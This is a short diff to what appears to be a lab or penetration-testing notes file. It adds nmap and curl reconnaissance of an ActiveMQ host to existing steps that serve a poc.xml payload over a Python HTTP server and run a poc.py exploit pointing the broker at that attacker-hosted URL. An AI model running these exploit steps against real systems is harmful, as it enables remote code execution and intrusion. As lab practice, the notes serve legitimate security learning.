@@ -28,6 +28,8 @@ nmap -O victim      # OS detection
 
 ### ActiveMQ
 ```bash
+nmap -sV -p 61616,8161 172.20.0.101
+curl -I http://172.20.0.101:8161/
 cd /opt
 python3 -m http.server 8888
 python3 poc.py -i 172.20.0.101 -p 61616 -u http://172.20.0.10:8888/poc.xml
